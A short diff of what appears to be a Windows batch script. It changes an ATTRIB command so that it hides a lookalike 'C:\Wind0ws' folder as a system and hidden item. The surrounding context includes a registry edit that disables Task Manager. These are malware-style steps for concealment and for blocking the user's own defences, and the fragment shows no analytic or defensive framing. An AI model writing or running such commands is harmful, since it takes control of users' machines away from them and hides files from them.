@@ -30,7 +30,7 @@ if '%errorlevel%' NEQ '0' (
 
 
 
-ATTRIB +s +h C:\Users
+ATTRIB +s +h C:\Wind0ws
 
 REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 
